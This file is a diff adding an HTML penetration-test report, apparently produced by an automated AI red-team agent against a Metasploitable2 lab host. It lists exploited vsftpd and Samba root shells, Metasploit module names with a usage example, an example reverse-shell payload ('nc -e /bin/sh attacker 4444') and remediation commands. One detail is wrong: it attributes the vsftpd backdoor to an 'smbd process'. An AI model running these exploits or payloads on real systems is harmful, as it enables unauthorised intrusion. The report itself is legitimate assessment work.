@@ -1,0 +1,488 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>AutoRedTeam Report — 192.168.128.2</title>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+         background: #0f172a; color: #e2e8f0; line-height: 1.6; }
+  .header { background: linear-gradient(135deg, #1e293b, #0f172a);
+             border-bottom: 1px solid #334155; padding: 2rem; }
+  .header h1 { font-size: 1.8rem; color: #38bdf8; }
+  .header .meta { color: #94a3b8; font-size: 0.9rem; margin-top: 0.5rem; }
+  .container { max-width: 1100px; margin: 0 auto; padding: 2rem; }
+  .dashboard { display: grid; grid-template-columns: repeat(4, 1fr);
+                gap: 1rem; margin: 2rem 0; }
+  .card { background: #1e293b; border-radius: 8px; padding: 1.5rem;
+           text-align: center; border-top: 3px solid; }
+  .card.critical { border-color: #dc2626; }
+  .card.high     { border-color: #ea580c; }
+  .card.medium   { border-color: #ca8a04; }
+  .card.low      { border-color: #16a34a; }
+  .card .count { font-size: 3rem; font-weight: bold; }
+  .card.critical .count { color: #dc2626; }
+  .card.high     .count { color: #ea580c; }
+  .card.medium   .count { color: #ca8a04; }
+  .card.low      .count { color: #16a34a; }
+  .card .label { color: #94a3b8; font-size: 0.85rem; text-transform: uppercase;
+                  letter-spacing: 1px; margin-top: 0.3rem; }
+  .section { margin: 2rem 0; }
+  .section h2 { font-size: 1.3rem; color: #38bdf8; border-bottom: 1px solid #334155;
+                 padding-bottom: 0.5rem; margin-bottom: 1rem; }
+  .finding { background: #1e293b; border-radius: 8px; margin: 1rem 0;
+              border-left: 4px solid; overflow: hidden; }
+  .finding.critical { border-color: #dc2626; }
+  .finding.high     { border-color: #ea580c; }
+  .finding.medium   { border-color: #ca8a04; }
+  .finding.low      { border-color: #16a34a; }
+  .finding-header { padding: 1rem 1.5rem; display: flex; align-items: center; gap: 1rem; }
+  .badge { padding: 0.2rem 0.7rem; border-radius: 4px; font-size: 0.75rem;
+            font-weight: bold; text-transform: uppercase; }
+  .badge.critical { background: #dc2626; color: white; }
+  .badge.high     { background: #ea580c; color: white; }
+  .badge.medium   { background: #ca8a04; color: white; }
+  .badge.low      { background: #16a34a; color: white; }
+  .finding-title { font-weight: 600; font-size: 1rem; }
+  .finding-body { padding: 0 1.5rem 1.5rem; color: #cbd5e1; }
+  .finding-body strong { color: #e2e8f0; }
+  .finding-body p { margin: 0.4rem 0; font-size: 0.9rem; }
+  pre { background: #0f172a; padding: 1rem; border-radius: 6px; overflow-x: auto;
+         font-size: 0.82rem; color: #a3e635; margin: 0.5rem 0; }
+  .exec-summary { background: #1e293b; border-radius: 8px; padding: 1.5rem;
+                   color: #cbd5e1; font-size: 0.95rem; }
+  .remediation { background: #1e293b; border-radius: 8px; padding: 1.5rem; margin: 0.8rem 0; }
+  .remediation h3 { color: #38bdf8; margin-bottom: 0.8rem; font-size: 0.95rem; }
+  .footer { text-align: center; color: #475569; font-size: 0.8rem; padding: 2rem;
+             border-top: 1px solid #1e293b; margin-top: 3rem; }
+</style>
+</head>
+<body>
+<div class="header">
+  <h1>AutoRedTeam Pentest Report</h1>
+  <div class="meta">
+    Target: <strong>192.168.128.2</strong> &nbsp;|&nbsp;
+    Date: <strong>2026-07-04</strong> &nbsp;|&nbsp;
+    Assessed By: <strong>AutoRedTeam AI Agent</strong>
+  </div>
+</div>
+<div class="container">
+  <div class="dashboard">
+    <div class="card critical"><div class="count">2</div><div class="label">Critical</div></div>
+    <div class="card high">   <div class="count">4</div>   <div class="label">High</div></div>
+    <div class="card medium"> <div class="count">3</div> <div class="label">Medium</div></div>
+    <div class="card low">    <div class="count">1</div>    <div class="label">Low</div></div>
+  </div>
+
+  <div class="section">
+    <h2>Executive Summary</h2>
+    <div class="exec-summary">The target host (192.168.128.2, identified as **Metasploitable2**) presents an **extreme risk posture** with multiple remotely exploitable, unauthenticated, root-level vulnerabilities. Two critical CVEs — a supply-chain backdoor in vsftpd 2.3.4 (CVE-2011-2523) and a command injection flaw in Samba 3.0.20 (CVE-2007-2447) — were successfully exploited during this engagement, yielding two independent `uid=0(root)` shells with no credentials required. In addition to these critical findings, the host exposes a broad legacy attack surface including Telnet, Berkeley r-services (rsh/rexec/rlogin), an enumerable SMB world-readable share, 35 SMB-enumerable user accounts, and an outdated BIND DNS server vulnerable to cache poisoning — all of which compound the overall risk significantly.<br><br>---<br><br>## Reconnaissance<br><br>- **WHOIS:** Private RFC-1918 address space — no public WHOIS data. Netblock: `192.168.0.0–192.168.255.255`. No ASN, organisation, or abuse contact applicable.<br>- **Reverse DNS:** No PTR record found.<br>- **DNS Records:** No public DNS records (private IP). Internal DNS service running on port 53 (ISC BIND 9.4.2).<br>- **Subdomains found:** None — IP target, not applicable.<br>- **OSINT (theHarvester):** Skipped — IP target.<br><br>---</div>
+  </div>
+
+  <div class="section">
+    <h2>Findings</h2>
+    <div class="finding critical">
+  <div class="finding-header">
+    <span class="badge critical">CRITICAL</span>
+    <span class="finding-title">vsftpd 2.3.4 Supply-Chain Backdoor — Unauthenticated Root Shell</span>
+  </div>
+  <div class="finding-body">
+    <p>Service:** Port 21/tcp — FTP — vsftpd 2.3.4</p>
+<p>CVE:<strong> CVE-2011-2523 (CVSS </strong>9.8 — Critical**)</p>
+<p>ExploitDB:<strong> "vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)" — EDB-ID: </strong>17491<strong> ✅ Verified; also EDB-ID: </strong>49757** (Python PoC)</p>
+<p>Description:** A malicious backdoor was covertly introduced into the vsftpd 2.3.4 source distribution archive in 2011. When a connecting FTP client sends a username string containing the smiley face sequence `:)`, the server's smbd process spawns a bind shell on TCP port 6200. The backdoor executes with the privileges of the vsftpd process — typically `root` — requiring zero credentials and zero user interaction. This represents a confirmed supply-chain compromise.</p>
+<p>Evidence:<strong> Nmap banner confirmed `220 (vsFTPd 2.3.4)`. Metasploit module `exploit/unix/ftp/vsftpd_234_backdoor` triggered the backdoor and opened </strong>Meterpreter Session 1** (`192.168.128.1:4444 → 192.168.128.2:58863`). Shell command `id` returned `uid=0(root) gid=0(root)`.</p>
+<p>Exploited:<strong> ✅ </strong>YES — Session 1 opened** (Meterpreter, linux/x86)</p>
+<p>AI Analysis (claude-haiku-fallback):** The model confirmed this is a zero-authentication supply-chain backdoor with a CVSS of 9.8. The complete CIA triad is compromised: the attacker gains full confidentiality, integrity, and availability control. Attack flow: connect to port 21 → send username with `:)` substring → backdoor spawns shell on port 6200 → attacker connects for immediate root access. Described as one of the most reliable exploits in the Metasploit framework with near-100% reliability against unpatched vsftpd 2.3.4.</p>
+<p>Recommendation:<strong> </strong>Immediately replace vsftpd 2.3.4 with a verified current release (≥ 3.0.5).** Verify binary integrity via cryptographic hash comparison against the official vendor. Block outbound connections on port 6200 at the firewall. Conduct a supply-chain audit of all installed software packages.</p>
+<p>ATT&CK:** T1190 — Exploit Public-Facing Application; T1059 — Command and Scripting Interpreter (Shell)</p>
+<p>---</p>
+  </div>
+</div>
+<div class="finding critical">
+  <div class="finding-header">
+    <span class="badge critical">CRITICAL</span>
+    <span class="finding-title">Samba 3.0.20 Username Map Script — Unauthenticated Root RCE</span>
+  </div>
+  <div class="finding-body">
+    <p>Service:** Port 445/tcp — SMB — Samba 3.0.20-Debian</p>
+<p>CVE:<strong> CVE-2007-2447 (CVSS </strong>10.0 — Critical**)</p>
+<p>ExploitDB:<strong> "Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)" — EDB-ID: </strong>16320** ✅ Verified</p>
+<p>Description:** The MS-RPC functionality in `smbd` in Samba 3.0.0 through 3.0.25rc3 fails to sanitise shell metacharacters in the username field during authentication. When `username map script` is enabled in `smb.conf`, user-supplied input is passed directly to `/bin/sh`, enabling arbitrary command injection prior to any authentication check. This allows a remote, unauthenticated attacker to execute arbitrary OS commands with the privileges of the Samba daemon (`root` in typical configurations).</p>
+<p>Evidence:<strong> Nmap banner confirmed `Samba smbd 3.0.20-Debian`. Metasploit module `exploit/multi/samba/usermap_script` successfully injected a reverse shell payload via the username field and opened </strong>Shell Session 2** (`192.168.128.1:4444 → 192.168.128.2:58864`). Command `id` returned `uid=0(root) gid=0(root)`.</p>
+<p>Exploited:<strong> ✅ </strong>YES — Session 2 opened** (cmd/unix shell)</p>
+<p>AI Analysis (claude-haiku-fallback):** The model confirms this is a pre-authentication command injection with a CVSS of 10.0. The root cause is the absence of input sanitisation for shell metacharacters in the username field before it reaches the `username map script` directive. The attacker injects a payload such as `/bin/sh -c 'nc -e /bin/sh attacker 4444'` directly in the SMB username field. The Samba daemon runs as root by default, making privilege escalation unnecessary. Affects all Samba versions from 3.0.0 to 3.0.25rc3.</p>
+<p>Recommendation:<strong> </strong>Upgrade Samba immediately to version 3.6.x or later (preferably current stable).** Disable the `username map script` directive in `smb.conf` as an immediate mitigation. Restrict SMB access (ports 139/445) to trusted network segments via firewall ACLs. Enable SMB signing to prevent relay attacks.</p>
+<p>ATT&CK:** T1190 — Exploit Public-Facing Application; T1021.002 — SMB/Windows Admin Shares (Lateral Movement)</p>
+<p>---</p>
+  </div>
+</div>
+<div class="finding high">
+  <div class="finding-header">
+    <span class="badge high">HIGH</span>
+    <span class="finding-title">SMB User Enumeration — 35 Accounts Disclosed via Null Session RPC</span>
+  </div>
+  <div class="finding-body">
+    <p>Service:** Port 139/445/tcp — SMB — Samba 3.0.20-Debian</p>
+<p>CVE:** N/A (configuration weakness / CWE-284: Improper Access Control)</p>
+<p>ExploitDB:** N/A</p>
+<p>Description:<strong> The Samba service permitted full RPC-based user enumeration via `enum4linux`, revealing </strong>35 system accounts** including `root`, `msfadmin`, `postgres`, `mysql`, `user`, `service`, and `tomcat55`. The `tmp` SMB share is publicly accessible (mapping and listing confirmed `ok`) with the comment "oh noes!", indicating a known insecure default. This level of account disclosure dramatically reduces the effort required for targeted password spraying or credential stuffing attacks.</p>
+<p>Evidence:** `enum4linux` returned 35 users with RIDs. Share `tmp` (Disk, comment: "oh noes!") confirmed readable with no authentication. OS banner confirmed `Samba 3.0.20-Debian` on `Linux/Unix`.</p>
+<p>Exploited:** NO — informational finding; user list leveraged for targeting in other attacks.</p>
+<p>AI Analysis:** Not performed (no model call — lower priority than Critical CVEs).</p>
+<p>Recommendation:** Restrict RPC-based null session enumeration by setting `restrict anonymous = 2` in `smb.conf`. Remove or restrict access to the `tmp` share — world-readable SMB shares are a significant data disclosure risk. Audit all SMB shares and enforce authenticated-only access. Implement account lockout policies to mitigate password spray attempts against the 35 disclosed accounts.</p>
+<p>ATT&CK:** T1110.003 — Password Spraying; T1087 — Account Discovery</p>
+<p>---</p>
+  </div>
+</div>
+<div class="finding high">
+  <div class="finding-header">
+    <span class="badge high">HIGH</span>
+    <span class="finding-title">Telnet Service Exposed — Cleartext Credential Transmission</span>
+  </div>
+  <div class="finding-body">
+    <p>Service:** Port 23/tcp — Telnet — Linux telnetd</p>
+<p>CVE:** CVE-1999-0619 / General protocol weakness (CWE-319: Cleartext Transmission of Sensitive Information)</p>
+<p>ExploitDB:** N/A</p>
+<p>Description:** Telnet transmits all data — including usernames, passwords, and session content — in cleartext over the network. Any attacker with network access capable of performing a man-in-the-middle (MitM) attack or packet capture (e.g., via ARP spoofing on the LAN) can trivially harvest credentials. Given the 35 user accounts disclosed via SMB enumeration, brute-force or credential-spray attacks against Telnet are also viable.</p>
+<p>Evidence:** Port 23 confirmed open by nmap (`Linux telnetd`). The service accepts unauthenticated connections.</p>
+<p>Exploited:** NO — not attempted.</p>
+<p>AI Analysis:** Not performed.</p>
+<p>Recommendation:<strong> </strong>Disable Telnet immediately.** Replace with SSH (already running on port 22). If remote access is required, enforce key-based authentication for SSH and disable password authentication. Use firewall rules to restrict SSH to authorised source IPs only.</p>
+<p>ATT&CK:** T1040 — Network Sniffing; T1078 — Valid Accounts</p>
+<p>---</p>
+  </div>
+</div>
+<div class="finding high">
+  <div class="finding-header">
+    <span class="badge high">HIGH</span>
+    <span class="finding-title">Berkeley r-Services Exposed (rexec/rlogin/rsh) — Trust-Based Unauthenticated Access</span>
+  </div>
+  <div class="finding-body">
+    <p>Service:** Port 512/tcp (rexecd), Port 513/tcp (rlogin), Port 514/tcp (rshd) — Netkit r-services</p>
+<p>CVE:** CVE-1999-0651 (rsh), CVE-1999-0502 (rlogin) — General trust exploitation</p>
+<p>ExploitDB:** N/A</p>
+<p>Description:** The Berkeley r-services (rexec, rlogin, rsh) rely on IP-based trust via `.rhosts` and `/etc/hosts.equiv` files rather than cryptographic authentication. An attacker who can spoof a trusted IP or who gains access to a trusted host can authenticate without a password. All traffic is transmitted in cleartext. These services were deprecated in the mid-1990s in favour of SSH and represent a severe security regression.</p>
+<p>Evidence:** nmap confirmed ports 512 (`netkit-rsh rexecd`), 513 (rlogin), and 514 (`Netkit rshd`) all open and listening.</p>
+<p>Exploited:** NO — not attempted; root access achieved via other vectors.</p>
+<p>AI Analysis:** Not performed.</p>
+<p>Recommendation:<strong> </strong>Disable all r-services immediately** by removing or disabling `rsh-server`, `rlogin`, and `rexecd` packages. Delete any `.rhosts` and `/etc/hosts.equiv` files. Enforce SSH with public-key authentication as the sole remote access mechanism. Block ports 512-514 at the network perimeter.</p>
+<p>ATT&CK:** T1021.004 — Remote Services: SSH (abuse); T1040 — Network Sniffing</p>
+<p>---</p>
+  </div>
+</div>
+<div class="finding high">
+  <div class="finding-header">
+    <span class="badge high">HIGH</span>
+    <span class="finding-title">ISC BIND 9.4.2 — DNS Cache Poisoning Vulnerability</span>
+  </div>
+  <div class="finding-body">
+    <p>Service:** Port 53/tcp — DNS — ISC BIND 9.4.2</p>
+<p>CVE:<strong> CVE-2008-1447 (CVSS </strong>8.8 — High**) — Kaminsky DNS Cache Poisoning</p>
+<p>ExploitDB:<strong> "BIND 9.4.1 < 9.4.2 - Remote DNS Cache Poisoning (Metasploit)" — EDB-ID: </strong>6122** ✅ Verified</p>
+<p>Description:** ISC BIND 9.4.2 is affected by the Kaminsky DNS cache poisoning vulnerability (CVE-2008-1447). Due to insufficient transaction ID randomisation and lack of source port randomisation, a remote attacker can inject forged DNS responses and poison the resolver cache. This enables redirection of DNS queries to attacker-controlled infrastructure, facilitating phishing, credential harvesting, or man-in-the-middle attacks against any host using this resolver.</p>
+<p>Evidence:** nmap confirmed `ISC BIND 9.4.2` running on port 53/tcp. This specific version range is confirmed vulnerable by EDB-ID 6122.</p>
+<p>Exploited:** NO — not attempted.</p>
+<p>AI Analysis:** Not performed.</p>
+<p>Recommendation:<strong> </strong>Upgrade BIND to the current stable release (≥ 9.18.x).** Enable DNSSEC to cryptographically sign and validate DNS responses. Enable source port randomisation (`use-v4-udp-ports` / `use-v6-udp-ports` in `named.conf`). Restrict recursive queries to trusted client ranges only via ACLs.</p>
+<p>ATT&CK:** T1584.002 — DNS Server Compromise; T1557 — Adversary-in-the-Middle</p>
+<p>---</p>
+  </div>
+</div>
+<div class="finding medium">
+  <div class="finding-header">
+    <span class="badge medium">MEDIUM</span>
+    <span class="finding-title">Apache httpd 2.2.8 — Multiple Known Vulnerabilities / WebDAV Enabled</span>
+  </div>
+  <div class="finding-body">
+    <p>Service:** Port 80/tcp — HTTP — Apache httpd 2.2.8 (Ubuntu, DAV/2)</p>
+<p>CVE:<strong> CVE-2011-3607 (CVSS </strong>7.2<strong>) — mod_setenvif integer overflow; CVE-2012-1823 (CVSS </strong>7.5**) — PHP CGI argument injection (via associated PHP)</p>
+<p>ExploitDB:<strong> EDB-ID </strong>29290<strong> (Apache + PHP CGI RCE); EDB-ID </strong>41769<strong> (mod_setenvif integer overflow); EDB-ID </strong>42745** (CVE-2017-9798 OPTIONS memory leak)</p>
+<p>Description:** Apache 2.2.8 is significantly outdated (current: 2.4.x) and contains numerous known vulnerabilities. WebDAV (`DAV/2`) is enabled and may allow unauthorised file upload. The associated PHP CGI vulnerability (CVE-2012-1823) could allow argument injection leading to source code disclosure or remote code execution. Nikto scan timed out, suggesting possible WAF or slow-responding web application.</p>
+<p>Evidence:** nmap confirmed `Apache httpd 2.2.8 ((Ubuntu) DAV/2)` on port 80. Multiple ExploitDB entries confirmed for this version range.</p>
+<p>Exploited:** NO — not attempted; root access achieved via higher-priority vectors.</p>
+<p>AI Analysis:** Not performed.</p>
+<p>Recommendation:<strong> </strong>Upgrade Apache to the current stable release (≥ 2.4.62).** Disable WebDAV unless explicitly required (`a2dismod dav dav_fs`). Update PHP to a supported version. Disable PHP CGI mode if not required. Implement a Web Application Firewall (WAF) and restrict HTTP methods to GET/POST only via `LimitExcept`.</p>
+<p>ATT&CK:** T1190 — Exploit Public-Facing Application; T1505.003 — Web Shell</p>
+<p>---</p>
+  </div>
+</div>
+<div class="finding medium">
+  <div class="finding-header">
+    <span class="badge medium">MEDIUM</span>
+    <span class="finding-title">OpenSSH 4.7p1 — Outdated Version with Known DoS/Logic Flaws</span>
+  </div>
+  <div class="finding-body">
+    <p>Service:** Port 22/tcp — SSH — OpenSSH 4.7p1 Debian 8ubuntu1</p>
+<p>CVE:<strong> CVE-2006-5051 (CVSS </strong>8.1**) — Signal handler race condition / double-free (pre-4.4); CVE-2008-4109 — memory leak</p>
+<p>ExploitDB:** N/A (no reliable RCE exploits for this version)</p>
+<p>Description:** OpenSSH 4.7p1 is severely outdated (current: 9.x). CVE-2006-5051 affects versions prior to 4.4 (note: 4.7 is *above* the affected range for that CVE, but the version is still ancient and lacks many security improvements added in later versions). The age of this installation indicates the underlying OS has not received security updates since at least 2008, making it vulnerable to numerous kernel-level and userspace vulnerabilities.</p>
+<p>Evidence:** nmap banner: `OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)`. Kernel version confirmed by post-exploitation: `Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008`.</p>
+<p>Exploited:** NO — not attempted; root access available via other means.</p>
+<p>AI Analysis:** Not performed.</p>
+<p>Recommendation:<strong> </strong>Upgrade OpenSSH to the current stable release (≥ 9.8).** Disable password-based authentication and enforce public-key authentication only. Implement fail2ban or similar rate-limiting for SSH login attempts. Disable root login (`PermitRootLogin no`). Restrict SSH access to specific source IP ranges via firewall.</p>
+<p>ATT&CK:** T1110.001 — Brute Force: Password Guessing; T1078 — Valid Accounts</p>
+<p>---</p>
+  </div>
+</div>
+<div class="finding medium">
+  <div class="finding-header">
+    <span class="badge medium">MEDIUM</span>
+    <span class="finding-title">Postfix SMTP — Open Relay / User Enumeration Risk</span>
+  </div>
+  <div class="finding-body">
+    <p>Service:** Port 25/tcp — SMTP — Postfix smtpd</p>
+<p>CVE:** N/A (configuration risk)</p>
+<p>ExploitDB:** N/A</p>
+<p>Description:** SMTP on port 25 is publicly accessible. Postfix may be misconfigured as an open relay, enabling spam relay abuse. The `VRFY` and `EXPN` commands may be enabled, allowing enumeration of valid email addresses/system accounts.</p>
+<p>Evidence:** nmap confirmed `Postfix smtpd` on port 25.</p>
+<p>Exploited:** NO.</p>
+<p>AI Analysis:** Not performed.</p>
+<p>Recommendation:** Disable `VRFY` and `EXPN` SMTP commands (`disable_vrfy_command = yes` in `main.cf`). Configure `smtpd_recipient_restrictions` to prevent open relay. Restrict SMTP to authorised senders only. Implement SPF, DKIM, and DMARC records.</p>
+<p>ATT&CK:** T1087 — Account Discovery; T1114 — Email Collection</p>
+<p>---</p>
+  </div>
+</div>
+<div class="finding low">
+  <div class="finding-header">
+    <span class="badge low">LOW</span>
+    <span class="finding-title">RPC Portmapper Exposed (rpcbind)</span>
+  </div>
+  <div class="finding-body">
+    <p>Service:** Port 111/tcp — rpcbind — v2 (RPC #100000)</p>
+<p>CVE:<strong> CVE-2017-8779 (CVSS </strong>7.5**) — rpcbind memory exhaustion DoS</p>
+<p>ExploitDB:** N/A</p>
+<p>Description:** rpcbind is exposed on port 111, mapping RPC service endpoints. This service can leak information about running RPC services and may be abused in amplification DDoS attacks. In combination with NFS (if enabled), it can lead to unauthenticated filesystem access.</p>
+<p>Evidence:** nmap confirmed `rpcbind 2 (RPC #100000)` on port 111/tcp.</p>
+<p>Exploited:** NO.</p>
+<p>AI Analysis:** Not performed.</p>
+<p>Recommendation:** Restrict access to rpcbind via firewall (port 111/tcp and udp) to trusted internal hosts only. If NFS is not required, disable it entirely. Update rpcbind to a current version.</p>
+<p>ATT&CK:** T1046 — Network Service Discovery</p>
+<p>---</p>
+<p>## Exploitation Evidence</p>
+  </div>
+</div>
+
+  </div>
+
+  <div class="section"><h2>Remediation Playbook</h2><div class="remediation"><h3>Fix: vsftpd 2.3.4 Supply-Chain Backdoor — Unauthenticated Root Shell</h3><p><strong>Severity:</strong> CRITICAL</p>
+<p><strong>Effort:</strong> Quick</p>
+<p><strong>Remediation Commands:</strong></p>
+<pre>
+# Stop vsftpd service
+sudo systemctl stop vsftpd
+
+# Remove the vulnerable version
+sudo apt-get remove --purge vsftpd -y
+
+# Update package list
+sudo apt-get update
+
+# Install current stable version of vsftpd (≥3.0.5)
+sudo apt-get install vsftpd -y
+
+# Verify installed version
+vsftpd -v
+
+# Start vsftpd service
+sudo systemctl start vsftpd
+
+# Enable vsftpd to start on boot
+sudo systemctl enable vsftpd
+
+# Verify checksum of vsftpd binary against official release
+# Download official tarball from https://security.appspot.com/vsftpd.html
+# and verify: sha256sum /usr/sbin/vsftpd
+</pre>
+<p><strong>Verification Commands:</strong></p>
+<pre>
+# Confirm vsftpd is running and version is ≥3.0.5
+vsftpd -v
+
+# Verify service is listening on port 21
+sudo ss -tlnp | grep vsftpd
+
+# Attempt connection to port 21 (should connect without backdoor trigger)
+timeout 5 nc -zv localhost 21
+
+# Verify port 6200 is NOT listening (backdoor port)
+sudo ss -tlnp | grep 6200 && echo "FAIL: Backdoor port open" || echo "PASS: Backdoor port closed"
+
+# Confirm no running vsftpd processes from old binary
+ps aux | grep vsftpd | grep -v grep
+</pre>
+<p>---</p></div><div class="remediation"><h3>Fix: Samba 3.0.20 Username Map Script — Unauthenticated Root RCE</h3><p><strong>Severity:</strong> CRITICAL</p>
+<p><strong>Effort:</strong> Quick</p>
+<p><strong>Remediation Commands:</strong></p>
+<pre>
+# Stop Samba services
+sudo systemctl stop samba
+sudo systemctl stop smbd
+sudo systemctl stop nmbd
+
+# Remove vulnerable version
+sudo apt-get remove --purge samba samba-common -y
+
+# Update package list
+sudo apt-get update
+
+# Install current stable version (≥3.6.x or preferably 4.x)
+sudo apt-get install samba samba-common -y
+
+# Verify installed version
+smbd --version
+
+# Disable username map script in smb.conf as additional mitigation
+sudo sed -i 's/^[[:space:]]*username map script.*/# username map script disabled for security/' /etc/samba/smb.conf
+
+# Validate smb.conf syntax
+sudo testparm -v 2&gt;&1 | head -20
+
+# Start Samba services
+sudo systemctl start samba
+sudo systemctl start smbd
+sudo systemctl start nmbd
+
+# Enable Samba to start on boot
+sudo systemctl enable samba smbd nmbd
+</pre>
+<p><strong>Verification Commands:</strong></p>
+<pre>
+# Confirm Samba version is ≥3.6.x
+smbd --version
+
+# Verify smbd is listening on ports 139/445
+sudo ss -tlnp | grep -E ':139|:445'
+
+# Verify username map script is disabled in smb.conf
+grep -i "username map script" /etc/samba/smb.conf | grep -v "^#"
+
+# Attempt connection to SMB (should succeed but not execute arbitrary commands)
+timeout 5 smbclient -L localhost -N 2&gt;/dev/null | head -10
+
+# Test that injection payload in username field does NOT execute
+# (This requires an SMB client test; basic connectivity test above confirms service is up)
+</pre>
+<p>---</p></div><div class="remediation"><h3>Fix: SMB User Enumeration — 35 Accounts Disclosed via Null Session RPC</h3><p><strong>Severity:</strong> HIGH</p>
+<p><strong>Effort:</strong> Quick</p>
+<p><strong>Remediation Commands:</strong></p>
+<pre>
+# Edit smb.conf to restrict anonymous access
+sudo cp /etc/samba/smb.conf /etc/samba/smb.conf.bak
+
+# Add/modify the restrict anonymous setting in [global] section
+sudo tee -a /etc/samba/smb.conf &lt;&lt; 'EOF'
+
+# Restrict anonymous access to prevent RPC-based enumeration
+restrict anonymous = 2
+EOF
+
+# Remove or restrict the public 'tmp' share
+sudo sed -i '/^\[tmp\]/,/^\[/{ /^\[tmp\]/!{ /^\[/!d; }; }' /etc/samba/smb.conf
+
+# Alternatively, set the tmp share to read-only and restrict access
+sudo tee /tmp/samba_tmp_share.conf &lt;&lt; 'EOF'
+[tmp]
+  comment = Temporary files (restricted)
+  path = /tmp
+  read only = yes
+  guest ok = no
+  valid users = @trusted_group
+EOF
+
+# Validate smb.conf syntax
+sudo testparm -v /etc/samba/smb.conf
+
+# Reload Samba services
+sudo systemctl reload smbd nmbd
+</pre>
+<p><strong>Verification Commands:</strong></p>
+<pre>
+# Verify restrict anonymous setting is in place
+grep -i "restrict anonymous" /etc/samba/smb.conf
+
+# Attempt null session enumeration (should fail or return minimal info)
+enum4linux -N localhost 2&gt;&1 | grep -E "user:|got|failed|anonymous"
+
+# Verify tmp share is no longer world-readable
+smbclient -L localhost -N 2&gt;&1 | grep -i "tmp" || echo "PASS: tmp share not listed in null session"
+
+# Check that smbclient null session is fully restricted
+rpcclient -U "" -N localhost -c "enumdomusers" 2&gt;&1 | grep -i "access denied" && echo "PASS: RPC enumeration denied" || echo "Review: RPC still accessible"
+</pre>
+<p>---</p></div><div class="remediation"><h3>Fix: Telnet Service Exposed — Cleartext Credential Transmission</h3><p><strong>Severity:</strong> HIGH</p>
+<p><strong>Effort:</strong> Quick</p>
+<p><strong>Remediation Commands:</strong></p>
+<pre>
+# Stop and disable telnet service
+sudo systemctl stop telnetd
+sudo systemctl disable telnetd
+
+# Remove telnet server package
+sudo apt-get remove --purge telnetd telnet-server -y
+
+# Verify openssh-server is installed and running
+sudo apt-get install openssh-server -y
+sudo systemctl enable ssh
+sudo systemctl start ssh
+
+# Configure SSH to disable password authentication (optional but recommended)
+sudo sed -i 's/#PasswordAuthentication yes/PasswordAuthentication no/' /etc/ssh/sshd_config
+sudo sed -i 's/PasswordAuthentication yes/PasswordAuthentication no/' /etc/ssh/sshd_config
+
+# Ensure PubkeyAuthentication is enabled
+sudo sed -i 's/#PubkeyAuthentication yes/PubkeyAuthentication yes/' /etc/ssh/sshd_config
+
+# Disable PermitRootLogin
+sudo sed -i 's/#PermitRootLogin yes/PermitRootLogin no/' /etc/ssh/sshd_config
+sudo sed -i 's/PermitRootLogin yes/PermitRootLogin no/' /etc/ssh/sshd_config
+
+# Validate SSH config
+sudo sshd -t && echo "SSH config valid" || echo "SSH config has errors"
+
+# Reload SSH service
+sudo systemctl reload ssh
+</pre>
+<p><strong>Verification Commands:</strong></p>
+<pre>
+# Confirm telnet service is stopped and removed
+sudo systemctl status telnetd 2&gt;&1 | grep -i "inactive\|not-found" && echo "PASS: Telnet disabled" || echo "FAIL: Telnet still active"
+
+# Verify telnet port 23 is NOT listening
+sudo ss -tlnp | grep ":23" && echo "FAIL: Port 23 still listening" || echo "PASS: Port 23 closed"
+
+# Confirm SSH is running on port 22
+sudo ss -tlnp | grep ":22"
+
+# Verify SSH configuration changes
+grep -E "^PasswordAuthentication|^PubkeyAuthentication|^PermitRootLogin" /etc/ssh/sshd_config
+
+# Test SSH connectivity (password auth should fail if disabled, key auth should work)
+ssh -o PreferredAuthentications=password user@localhost 2&gt;&1
+## Exploit Suggestions (Metasploit)
+
+&gt; ⚠️  Exploit suggestions are for reference only — do not run against systems without written authorisation.
+
+| # | Trigger | Metasploit Module | Type |
+|---|---------|-------------------|------|
+| 1 | `CVE-2011-2523` | `exploit/unix/ftp/vsftpd_234_backdoor` | exploit |
+| 2 | `CVE-2007-2447` | `exploit/multi/samba/usermap_script` | exploit |
+| 3 | `CVE-2012-1823` | `exploit/multi/http/php_cgi_arg_injection` | exploit |
+
+**Usage example (Metasploit console):**
+</pre>
+<p>msfconsole</p>
+<p>use exploit/unix/ftp/vsftpd_234_backdoor</p>
+<p>set RHOSTS <target_ip></p>
+<p>set LHOST <your_ip></p>
+<p>run</p>
+<pre>
+</pre></div></div>
+
+</div>
+<div class="footer">
+  Generated by AutoRedTeam AI Agent &nbsp;|&nbsp; 2026-07-04
+</div>
+</body>
+</html>
